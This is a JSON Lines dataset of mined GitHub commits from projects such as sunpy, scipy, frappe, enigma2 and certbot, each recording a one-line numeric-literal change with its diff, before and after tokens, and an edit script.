{"project": "sunpy", "commit_sha": "52a65423407604ab4da6d761329256eb093793d7", "parent_sha": "d47feb637e214b89ef002b67dde0e22e28c7e29f", "file_path": "sunpy/tests/time/test_time.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ def test_parse_time_24_2():\n \n def test_parse_time_trailing_zeros():\n     # see issue #289 at https://github.com/sunpy/sunpy/issues/289\n-    assert parse_time('2010-10-10T00:00:00.00000000') == datetime(2010, 10, 11)\n+    assert parse_time('2010-10-10T00:00:00.00000000') == datetime(2010, 10, 10)\n \n def test_parse_time_tuple():\n     assert parse_time((1966, 2, 3)) == LANDING\n", "before": "assert parse_time ( '2010-10-10T00:00:00.00000000' ) == datetime ( 2010 , 10 , 11 )", "after": "assert parse_time ( '2010-10-10T00:00:00.00000000' ) == datetime ( 2010 , 10 , 10 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:11\", 3, 77, 3, 79], \"10\"]]"}
{"project": "sunpy", "commit_sha": "eca7116c5d931bce095508f6f5534de109a4f996", "parent_sha": "5fdd0b4feb33d93bc9cd8e00efd5eec574cc07c4", "file_path": "sunpy/map/mapbase.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -815,7 +815,7 @@ installed, falling back to the interpolation='spline' of order=3\"\"\" ,Warning)\n \n # #### Visualization #### #\n \n-    def draw_grid(self, axes=None, grid_spacing=20, **kwargs):\n+    def draw_grid(self, axes=None, grid_spacing=15, **kwargs):\n", "before": "def draw_grid ( self , axes = None , grid_spacing = 20 , ** kwargs ) : ", "after": "def draw_grid ( self , axes = None , grid_spacing = 15 , ** kwargs ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:20\", 3, 49, 3, 51], \"15\"]]"}
{"project": "sunpy", "commit_sha": "5cb29c699d41f945151649755fb31cafe338d271", "parent_sha": "927f72eb678a2383f709f31e3a88e914aa132086", "file_path": "sunpy/database/tests/test_database.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -809,7 +809,7 @@ def test_fetch_separate_filenames():\n     db.fetch(*download_query, path=path)\n \n     # Test\n-    assert len(db) == 2\n+    assert len(db) == 4\n \n     dir_contents = os.listdir(tmp_test_dir)\n     assert 'aia_lev1_335a_2012_08_05t00_00_02_62z_image_lev1.fits' in dir_contents\n", "before": "assert len ( db ) == 2", "after": "assert len ( db ) == 4", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 23, 3, 24], \"4\"]]"}
{"project": "sunpy", "commit_sha": "7387447e537d06d12b4636bfae9903a94ba770d8", "parent_sha": "3e96d37a920217249d3b4ddd1c547990ebcb647d", "file_path": "sunpy/map/mapbase.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -565,7 +565,7 @@ Dimension:\\t [%d, %d]\n         new_map.meta = new_meta\n         return new_map\n \n-    def rotate(self, angle=None, rmatrix=None, order=3, scale=1.0,\n+    def rotate(self, angle=None, rmatrix=None, order=4, scale=1.0,\n                rotation_center=(0,0), recenter=False, missing=0.0, use_scipy=False):\n", "before": "def rotate ( self , angle = None , rmatrix = None , order = 3 , scale = 1.0 , rotation_center = ( 0 , 0 ) , recenter = False , missing = 0.0 , use_scipy = False ) : ", "after": "def rotate ( self , angle = None , rmatrix = None , order = 4 , scale = 1.0 , rotation_center = ( 0 , 0 ) , recenter = False , missing = 0.0 , use_scipy = False ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 54, 3, 55], \"4\"]]"}
{"project": "sunpy", "commit_sha": "ed6586e6788d148350946762e99b7875fa378c4e", "parent_sha": "1091c59b53ab73ced0187f58aad746af4bfa2a3e", "file_path": "sunpy/net/jsoc/tests/test_jsoc.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ def test_wait_get():\n     responses = client.query(attrs.Time('2012/1/3T00:00:00', '2012/1/3T00:00:45'), attrs.Series( 'hmi.M_45s'))\n     res = client.get(responses)\n     assert isinstance(res, Results)\n-    assert res.total == 1\n+    assert res.total == 2\n \n @pytest.mark.online\n def test_check_request():\n", "before": "assert res . total == 1", "after": "assert res . total == 2", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 25, 3, 26], \"2\"]]"}
{"project": "sunpy", "commit_sha": "177d208fa2f7d66461a1fe843a79d1983f789853", "parent_sha": "bf12bc3afc61d428f808bd107101c63a8055e241", "file_path": "sunpy/coordinates/tests/test_ephemeris.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -84,4 +84,4 @@ def test_consistency_with_horizons(tmpdir):\n     e1 = get_earth()\n     with set_temp_cache(tmpdir):\n         e2 = get_horizons_coord('Geocenter')\n-    assert_quantity_allclose(e1.separation_3d(e2), 0*u.km, atol=25*u.km)\n+    assert_quantity_allclose(e1.separation_3d(e2), 0*u.km, atol=35*u.km)\n", "before": "assert_quantity_allclose ( e1 . separation_3d ( e2 ) , 0 * u . km , atol = 25 * u . km )", "after": "assert_quantity_allclose ( e1 . separation_3d ( e2 ) , 0 * u . km , atol = 35 * u . km )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:25\", 3, 65, 3, 67], \"35\"]]"}
{"project": "maltrail", "commit_sha": "ef45974716c15c7e4c5739f29ae55be78b63d48b", "parent_sha": "3d087cdc9ed811bf367034d350f8e056ce412739", "file_path": "core/httpd.py", "project_url": "https://github.com/PaulSec/maltrail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -270,7 +270,7 @@ def start_httpd(address=None, port=None, join=False, pem=None):\n                                 netfilters.remove(netfilter)\n                         elif '-' in netfilter:\n                             _ = netfilter.split('-')\n-                            lower, upper = addr_to_int(_[0]), addr_to_int(_[0])\n+                            lower, upper = addr_to_int(_[0]), addr_to_int(_[1])\n                             while lower <= upper:\n                                 netfilters.add(int_to_addr(lower))\n                                 lower += 1\n", "before": "lower , upper = addr_to_int ( _ [ 0 ] ) , addr_to_int ( _ [ 0 ] )", "after": "lower , upper = addr_to_int ( _ [ 0 ] ) , addr_to_int ( _ [ 1 ] )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 77, 3, 78], \"1\"]]"}
{"project": "CTPTrader", "commit_sha": "3cce29f209673c084bd56675bd7392ccac1cb1f3", "parent_sha": "b4d14513c2c44e2bf042379d292e203d26b73992", "file_path": "strategies/liao/liao.py", "project_url": "https://github.com/JimmyStudio/CTPTrader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -291,7 +291,7 @@ class Variables(object):\n \n         self.slippage = 2 # \u5f00\u4ed3\u4ef7\u4e0a\u4e0b\u6d6e\u52a81\u4e2a\u53d8\u52a8\u5355\u4f4d\n \n-        self.open_thres = 1  # \u5f00\u4ed3tick\u500d\u6570\n+        self.open_thres = 10  # \u5f00\u4ed3tick\u500d\u6570\n         self.open_num_from_big_bar = 4 # \u4ece\u5927\u9633\u7ebf\u540e\u7b2c5\u4e2a\u5f00\u59cb\u5224\u65ad\u662f\u5426\u5f00\u4ed3\n         self.max_open_num_from_big_bar = 24 # \u6700\u591a\u5224\u65ad\u8fde\u7eed25\u4e2a\n         self.stop_gain_thres = 0.5\n", "before": "self . open_thres = 1", "after": "self . open_thres = 10", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 27, 3, 28], \"10\"]]"}
{"project": "python-pysight", "commit_sha": "42660df665ffa82b6236a510f388fe6543f7ac7c", "parent_sha": "a705ed26fc82375086a902ab2fe7e76e5f6756d0", "file_path": "src/pysight/read_lst.py", "project_url": "https://github.com/HagaiHargil/python-pysight", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class ReadData:\n     def _determine_num_of_lines(self, debug, bytess):\n         \"\"\" In debug runs we don't read all lines \"\"\"\n         if debug:\n-            num_of_lines = int(1.2e6 * bytess)  # 200k events is usually enough\n+            num_of_lines = int(0.2e6 * bytess)  # 200k events is usually enough\n             printstr = f'[DEBUG] Reading file \"{self.filename}\"...'\n         else:\n             num_of_lines = -1\n", "before": "num_of_lines = int ( 1.2e6 * bytess )", "after": "num_of_lines = int ( 0.2e6 * bytess )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1.2e6\", 3, 32, 3, 37], \"0.2e6\"]]"}
{"project": "saloon_frappe", "commit_sha": "c8066cba9ab2a1f432c629bec7dcc504fc7e53ce", "parent_sha": "43dd3b2c0e839c4e4803d558cff6664c5201b658", "file_path": "frappe/database.py", "project_url": "https://github.com/gangadharkadam/saloon_frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -169,7 +169,7 @@ class Database:\n \n \t\tif query[:6].lower() in ['update', 'insert']:\n \t\t\tself.transaction_writes += 1\n-\t\t\tif self.transaction_writes > 10000:\n+\t\t\tif self.transaction_writes > 20000:\n \t\t\t\tif self.auto_commit_on_many_writes:\n \t\t\t\t\tfrappe.db.commit()\n \t\t\t\telse:\n", "before": "if self . transaction_writes > 10000 : if self . auto_commit_on_many_writes : frappe . db . commit ( ) else : ", "after": "if self . transaction_writes > 20000 : if self . auto_commit_on_many_writes : frappe . db . commit ( ) else : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10000\", 3, 33, 3, 38], \"20000\"]]"}
{"project": "saloon_frappe", "commit_sha": "629fcb2988a6a54b430ead629a6c1d0fbd8de738", "parent_sha": "9b0d9d732d0db32e3775ba20bf94ee13a24bfe73", "file_path": "frappe/tests/test_data_import.py", "project_url": "https://github.com/gangadharkadam/saloon_frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class TestDataImport(unittest.TestCase):\n \t\tcontent.append([\"\"] * len(content[-2]))\n \t\tcontent[-1][2] = \"__Test Event\"\n \t\tcontent[-1][3] = \"Private\"\n-\t\tcontent[-1][3] = \"2014-01-01 10:00:00.000000\"\n+\t\tcontent[-1][4] = \"2014-01-01 10:00:00.000000\"\n \t\tcontent[-1][content[15].index(\"person\")] = \"Administrator\"\n \t\timporter.upload(content)\n \n", "before": "content [ - 1 ] [ 3 ] = \"2014-01-01 10:00:00.000000\"", "after": "content [ - 1 ] [ 4 ] = \"2014-01-01 10:00:00.000000\"", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 15, 3, 16], \"4\"]]"}
{"project": "saloon_frappe", "commit_sha": "7adc1a671b6e446610780b85192dac3202ddf5e3", "parent_sha": "7a5acf8c9767061d569f813da4b88b1aa6b96167", "file_path": "frappe/core/doctype/customize_form/test_customize_form.py", "project_url": "https://github.com/gangadharkadam/saloon_frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class TestCustomizeForm(unittest.TestCase):\n \n \t\td = self.get_customize_form(\"User\")\n \t\tself.assertEquals(d.doc_type, \"User\")\n-\t\tself.assertEquals(len(d.get(\"customize_form_fields\")), 54)\n+\t\tself.assertEquals(len(d.get(\"customize_form_fields\")), 55)\n \t\tself.assertEquals(d.get(\"customize_form_fields\")[-1].fieldname, \"test_custom_field\")\n \t\tself.assertEquals(d.get(\"customize_form_fields\", {\"fieldname\": \"location\"})[0].in_list_view, 1)\n \n", "before": "self . assertEquals ( len ( d . get ( \"customize_form_fields\" ) ) , 54 )", "after": "self . assertEquals ( len ( d . get ( \"customize_form_fields\" ) ) , 55 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:54\", 3, 58, 3, 60], \"55\"]]"}
{"project": "sterp", "commit_sha": "19da0247c83ac325c65f402e46bdc6d140e2cdfa", "parent_sha": "c674e43885bffde3752872392fd48a016487ff4c", "file_path": "accounts/doctype/cost_center/cost_center.py", "project_url": "https://github.com/gangadharkadam/sterp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class DocType:\n     webnotes.utils.nestedset.update_nsm(self)  \n     \n   def check_if_child_exists(self):\n-    return sql(\"select name from `tabCost Center` where parent_cost_center = %s and docstatus != 2\", self.doc.name, debug=1)\n+    return sql(\"select name from `tabCost Center` where parent_cost_center = %s and docstatus != 2\", self.doc.name, debug=0)\n     \n   # On Trash\n   # --------\n", "before": "return sql ( \"select name from `tabCost Center` where parent_cost_center = %s and docstatus != 2\" , self . doc . name , debug = 1 )", "after": "return sql ( \"select name from `tabCost Center` where parent_cost_center = %s and docstatus != 2\" , self . doc . name , debug = 0 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 123, 3, 124], \"0\"]]"}
{"project": "fuel", "commit_sha": "9fa7b426d5649a6b1e051adab96c6824a0925fc3", "parent_sha": "0e7dfb7b1c7bd41541c5ea42d631ad5504773d09", "file_path": "tests/test_server.py", "project_url": "https://github.com/basveeling/fuel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class TestServer(object):\n         expected_data = get_stream().get_epoch_iterator()\n         for _, s, e in zip(range(3), server_data, expected_data):\n             for data in zip(s, e):\n-                assert_allclose(*data, rtol=1e-3)\n+                assert_allclose(*data, rtol=1e-2)\n         assert_raises(StopIteration, next, server_data)\n \n     def test_value_error_on_request(self):\n", "before": "assert_allclose ( * data , rtol = 1e-3 )", "after": "assert_allclose ( * data , rtol = 1e-2 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1e-3\", 3, 45, 3, 49], \"1e-2\"]]"}
{"project": "scipy", "commit_sha": "52f859c251263171a9773451896ce9486c25a367", "parent_sha": "d1097d4e31e41b8107d474185f7cbb6c7fe49355", "file_path": "scipy/stats/tests/test_morestats.py", "project_url": "https://github.com/GregoryEAllen/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -604,7 +604,7 @@ class TestKstat(TestCase):\n         for n in [1, 2, 3, 4]:\n             moments.append(stats.kstat(data, n))\n \n-        expected = [0.011315, 1.017931, 0.05811052, 0.0754137]\n+        expected = [0.011315, 1.017931, 0.05811052, 0.0754134]\n         assert_allclose(moments, expected, rtol=1e-4)\n \n     def test_kstat_bad_arg(self):\n", "before": "expected = [ 0.011315 , 1.017931 , 0.05811052 , 0.0754137 ]", "after": "expected = [ 0.011315 , 1.017931 , 0.05811052 , 0.0754134 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:0.0754137\", 3, 53, 3, 62], \"0.0754134\"]]"}
{"project": "sympy", "commit_sha": "3da570c9fb7f29efe011d29c22e0810be00362b3", "parent_sha": "acea08ada404ddddc65dcbb3beef1aca7799ff76", "file_path": "sympy/simplify/tests/test_simplify.py", "project_url": "https://github.com/sampadsaha5/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -229,7 +229,7 @@ def test_issue_3210():\n \n def test_issue_7263():\n     assert abs((simplify(30.8**2 - 82.5**2 * sin(rad(11.6))**2)).evalf() - \\\n-            673.447451402970) < 1e-15\n+            673.447451402970) < 1e-12\n \n \n def test_trigsimp_issues():\n", "before": "assert abs ( ( simplify ( 30.8 ** 2 - 82.5 ** 2 * sin ( rad ( 11.6 ) ) ** 2 ) ) . evalf ( ) - 673.447451402970 ) < 1e-15", "after": "assert abs ( ( simplify ( 30.8 ** 2 - 82.5 ** 2 * sin ( rad ( 11.6 ) ) ** 2 ) ) . evalf ( ) - 673.447451402970 ) < 1e-12", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1e-15\", 3, 33, 3, 38], \"1e-12\"]]"}
{"project": "PersonalAssistant", "commit_sha": "a10e5d3a5812072ff9814406f49421cd0630fb6f", "parent_sha": "65f4b41577e154ea71d319f7e4aad71032cdaeb9", "file_path": "Samantha/plugins/schedule_plugin.py", "project_url": "https://github.com/Sirs0ri/PersonalAssistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class Plugin_Thread(threading.Thread):\n             if not self.hour == self.old_hour:\n                 core.get_answer(\"schedule_h\", self.hour)\n                 self.old_hour = self.hour\n-            time.sleep(30.0 - ((time.time() - starttime) % 60.0))\n+            time.sleep(30.0 - ((time.time() - starttime) % 30.0))\n         core.log(self.name, \"Not running anymore.\")\n         \n     def stop(self):\n", "before": "time . sleep ( 30.0 - ( ( time . time ( ) - starttime ) % 60.0 ) )", "after": "time . sleep ( 30.0 - ( ( time . time ( ) - starttime ) % 30.0 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:60.0\", 3, 60, 3, 64], \"30.0\"]]"}
{"project": "python-fedora", "commit_sha": "30a7d06b54efb03d3c108e1f8018b6690cecaa39", "parent_sha": "d70b20e1b072126e0de50e383865e66f09667ad0", "file_path": "fedora/tg/controllers.py", "project_url": "https://github.com/AdamWill/python-fedora", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def login(forward_url=None, *args, **kwargs):\n         if not forward_url:\n             forward_url = request.headers.get('Referer', '/')\n \n-    response.status = 401\n+    response.status = 403\n     return dict(logging_in=True, message=msg,\n         forward_url=forward_url, previous_url=request.path_info,\n         original_parameters=request.params)\n", "before": "response . status = 401", "after": "response . status = 403", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:401\", 3, 23, 3, 26], \"403\"]]"}
{"project": "scipy", "commit_sha": "dcca2a1be393d7a19d876d002c9ee41602d4cb5f", "parent_sha": "bbac0813579b114dd04c6dd00b8cc4e953df51c9", "file_path": "Lib/stats/distributions.py", "project_url": "https://github.com/GregoryEAllen/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,8 @@ def seed(x=0,y=0):\n     if y == 0:\n         import random\n         y = int(rv.initial_seed())\n-        x = random.randint(1,2**31-1)\n+        x = random.randint(1,2**31-2) # Python 2.1 and 2.2 require -2 instead\n+                                      # of -1...bug in random.randint?\n     rand.set_seeds(x,y)\n \n seed()\n", "before": "x = random . randint ( 1 , 2 ** 31 - 1 )", "after": "x = random . randint ( 1 , 2 ** 31 - 2 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 36, 3, 37], \"2\"]]"}
{"project": "enigma2", "commit_sha": "5a576461a7815cf23bc38118a711316dd12167c9", "parent_sha": "7953c0efdddb225800d69238bb0ac90a44fc73cf", "file_path": "lib/python/Tools/Directories.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ def defaultRecordingLocation(candidate=None):\n \t\thavelocal = False\n \t\tfor candidate in mounts:\n \t\t\ttry:\n-\t\t\t\tislocal = candidate[1].startswith('/dev/') # Good enough\n+\t\t\t\tislocal = candidate[0].startswith('/dev/') # Good enough\n \t\t\t\tstat = os.statvfs(candidate[1])\n \t\t\t\t# Free space counts double\n \t\t\t\tsize = (stat.f_blocks + stat.f_bavail) * stat.f_bsize\n", "before": "islocal = candidate [ 1 ] . startswith ( '/dev/' )", "after": "islocal = candidate [ 0 ] . startswith ( '/dev/' )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 25, 3, 26], \"0\"]]"}
{"project": "enigma2", "commit_sha": "06eb60f4ae989bba30dd94c1f9fe9934a9237416", "parent_sha": "7f088b2e0ec5051c3b9b9a1942198f0be28f315b", "file_path": "lib/python/Components/NimManager.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -749,7 +749,7 @@ def InitSecParams():\n \tx.addNotifier(lambda configElement: secClass.setParam(secClass.DELAY_AFTER_VOLTAGE_CHANGE_BEFORE_MOTOR_CMD, configElement.value))\n \tconfig.sec.delay_after_voltage_change_before_motor_command = x\n \n-\tx = ConfigInteger(default=120, limits = (0, 9999))\n+\tx = ConfigInteger(default=360, limits = (0, 9999))\n \tx.addNotifier(lambda configElement: secClass.setParam(secClass.MOTOR_RUNNING_TIMEOUT, configElement.value))\n \tconfig.sec.motor_running_timeout = x\n \n", "before": "x = ConfigInteger ( default = 120 , limits = ( 0 , 9999 ) )", "after": "x = ConfigInteger ( default = 360 , limits = ( 0 , 9999 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:120\", 3, 28, 3, 31], \"360\"]]"}
{"project": "hytra", "commit_sha": "241f9f03122281de1598b9c30813f6a9e7608bfe", "parent_sha": "6d0d4806470067595a21b3021644361204901220", "file_path": "scripts/hypotheses_graph_to_json.py", "project_url": "https://github.com/chaubold/hytra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def getConfigAndCommandLineArguments():\n     parser.add_argument('--without-constraints', dest='woconstr', action='store_true', default=False)\n     parser.add_argument('--trans-par', dest='trans_par', type=float, default=5.0,\n                         help='alpha for the transition prior')\n-    parser.add_argument('--border-width', dest='border_width', type=float, default=0.0,\n+    parser.add_argument('--border-width', dest='border_width', type=float, default=10.0,\n                         help='absolute border margin in which the appearance/disappearance costs are linearly decreased')\n     parser.add_argument('--ext-probs', dest='ext_probs', type=str, default=None,\n                         help='provide a path to hdf5 files containing detection probabilities')\n", "before": "parser . add_argument ( '--border-width' , dest = 'border_width' , type = float , default = 0.0 , help = 'absolute border margin in which the appearance/disappearance costs are linearly decreased' )", "after": "parser . add_argument ( '--border-width' , dest = 'border_width' , type = float , default = 10.0 , help = 'absolute border margin in which the appearance/disappearance costs are linearly decreased' )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:0.0\", 3, 84, 3, 87], \"10.0\"]]"}
{"project": "PySAT", "commit_sha": "6299f13ce1d651971aafa7ad3e2da6df45e94240", "parent_sha": "1362a4e037d131e276a29c4111bfb0ed330c1ef1", "file_path": "pysat/spectral/baseline_code/ccam_remove_continuum.py", "project_url": "https://github.com/ryanbanderson/PySAT", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -187,7 +187,7 @@ def ccam_remove_continuum(x, y, lv, lvmin=2, int_flag=2):\n \n \n class ccam_br(Baseline):\n-    def __init__(self, lv=10, lvmin=2, int_flag=2):\n+    def __init__(self, lv=7, lvmin=2, int_flag=2):\n         self.lv_ = lv\n         self.lvmin_ = lvmin\n         self.int_flag_ = int_flag\n", "before": "def __init__ ( self , lv = 10 , lvmin = 2 , int_flag = 2 ) : self . lv_ = lv self . lvmin_ = lvmin self . int_flag_ = int_flag", "after": "def __init__ ( self , lv = 7 , lvmin = 2 , int_flag = 2 ) : self . lv_ = lv self . lvmin_ = lvmin self . int_flag_ = int_flag", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10\", 3, 27, 3, 29], \"7\"]]"}
{"project": "PySAT", "commit_sha": "280b8695d69215202544007bb8f4dfcc82a375a7", "parent_sha": "29ea6adf189fb4293704f3820d061b8cd9cc2ece", "file_path": "tests/data/test_from_file.py", "project_url": "https://github.com/ryanbanderson/PySAT", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ def spectral_profiler_2c():\n def test_read_sp(spectral_profiler_2c):\n     s = Spectra.from_file(spectral_profiler_2c)\n     assert len(s.data.index) == 269\n-    assert len(s.metadata.index) == 43\n+    assert len(s.metadata.index) == 139\n     assert isinstance(s, Spectra)\n     assert isinstance(s.data, Spectra)\n     \n\\ No newline at end of file\n", "before": "assert len ( s . metadata . index ) == 43", "after": "assert len ( s . metadata . index ) == 139", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:43\", 3, 37, 3, 39], \"139\"]]"}
{"project": "enigma2", "commit_sha": "010d0d2ab99480f110856acd8f1886f86decddbd", "parent_sha": "44e67db8a1d414d00fb477b8d2cf81c72bb20cf0", "file_path": "lib/python/Tools/Multiboot.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3,7 +3,7 @@ from Components.Console import Console\n import os\n \n def GetCurrentImage():\n-\treturn SystemInfo[\"canMultiBoot\"] and (int(open('/sys/firmware/devicetree/base/chosen/bootargs', 'r').read().replace('\\0', '').split('=')[1].split('p')[1].split(' ')[0])-SystemInfo[\"canMultiBoot\"][1])/2\n+\treturn SystemInfo[\"canMultiBoot\"] and (int(open('/sys/firmware/devicetree/base/chosen/bootargs', 'r').read().replace('\\0', '').split('=')[1].split('p')[1].split(' ')[0])-SystemInfo[\"canMultiBoot\"][0])/2\n \n def GetCurrentImageMode():\n \treturn SystemInfo[\"canMultiBoot\"] and SystemInfo[\"canMode12\"] and int(open('/sys/firmware/devicetree/base/chosen/bootargs', 'r').read().replace('\\0', '').split('=')[-1])\n", "before": "return SystemInfo [ \"canMultiBoot\" ] and ( int ( open ( '/sys/firmware/devicetree/base/chosen/bootargs' , 'r' ) . read ( ) . replace ( '\\0' , '' ) . split ( '=' ) [ 1 ] . split ( 'p' ) [ 1 ] . split ( ' ' ) [ 0 ] ) - SystemInfo [ \"canMultiBoot\" ] [ 1 ] ) / 2", "after": "return SystemInfo [ \"canMultiBoot\" ] and ( int ( open ( '/sys/firmware/devicetree/base/chosen/bootargs' , 'r' ) . read ( ) . replace ( '\\0' , '' ) . split ( '=' ) [ 1 ] . split ( 'p' ) [ 1 ] . split ( ' ' ) [ 0 ] ) - SystemInfo [ \"canMultiBoot\" ] [ 0 ] ) / 2", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 199, 3, 200], \"0\"]]"}
{"project": "certbot", "commit_sha": "8464ce30d55dedcd203f25ab0e7e7c11487b3b4d", "parent_sha": "122e6b2ca1c1c6283f565f1f0ba7064800eea032", "file_path": "letsencrypt/client/le_util.py", "project_url": "https://github.com/barkinet/certbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def check_permissions(filepath, mode, uid=0):\n     return stat.S_IMODE(file_stat.st_mode) == mode and file_stat.st_uid == uid\n \n \n-def unique_file(default_name, mode=0777):\n+def unique_file(default_name, mode=0644):\n     \"\"\"Safely finds a unique file for writing only (by default).\"\"\"\n     count = 1\n     f_parsed = os.path.splitext(default_name)\n", "before": "def unique_file ( default_name , mode = 0777 ) : \"\"\"Safely finds a unique file for writing only (by default).\"\"\" count = 1 f_parsed = os . path . splitext ( default_name )", "after": "def unique_file ( default_name , mode = 0644 ) : \"\"\"Safely finds a unique file for writing only (by default).\"\"\" count = 1 f_parsed = os . path . splitext ( default_name )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0777\", 3, 36, 3, 40], \"0644\"]]"}
{"project": "certbot", "commit_sha": "f2a3f830e6c43127e3ec5733936f9cc731f4561a", "parent_sha": "1019a47b314874332627e5956b6a5bd4465a36fb", "file_path": "server-ca/chocolate.py", "project_url": "https://github.com/barkinet/certbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -269,7 +269,7 @@ class session(object):\n         # do what the daemon does, and then return the challenges instead\n         # of returning proceed.\n         r.proceed.timestamp = int(time.time())\n-        r.proceed.polldelay = 10\n+        r.proceed.polldelay = 4\n \n     def handleexistingsession(self, m, r):\n         if m.request.IsInitialized():\n", "before": "r . proceed . polldelay = 10", "after": "r . proceed . polldelay = 4", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10\", 3, 31, 3, 33], \"4\"]]"}
{"project": "website", "commit_sha": "b1210172b386a93ee0fddf6a896ae2bb3b446f14", "parent_sha": "ba189f2054e5397ef29eb280d19caf4f6c174bd6", "file_path": "objection/models.py", "project_url": "https://github.com/SutCEGoS/website", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class Objection(models.Model):\n             return Objection.objects.all()\n         if member.groups.filter(name='Replier').exists():\n             return Objection.objects.filter(status__gte=3)\n-        return Objection.objects.filter(Q(status__in=[1, 2, 4, 5]) | Q(sender=member))\n+        return Objection.objects.filter(Q(status__in=[1, 3, 4, 5]) | Q(sender=member))\n \n     def get_serialized(self, member):\n         return {\n", "before": "return Objection . objects . filter ( Q ( status__in = [ 1 , 2 , 4 , 5 ] ) | Q ( sender = member ) )", "after": "return Objection . objects . filter ( Q ( status__in = [ 1 , 3 , 4 , 5 ] ) | Q ( sender = member ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 58, 3, 59], \"3\"]]"}
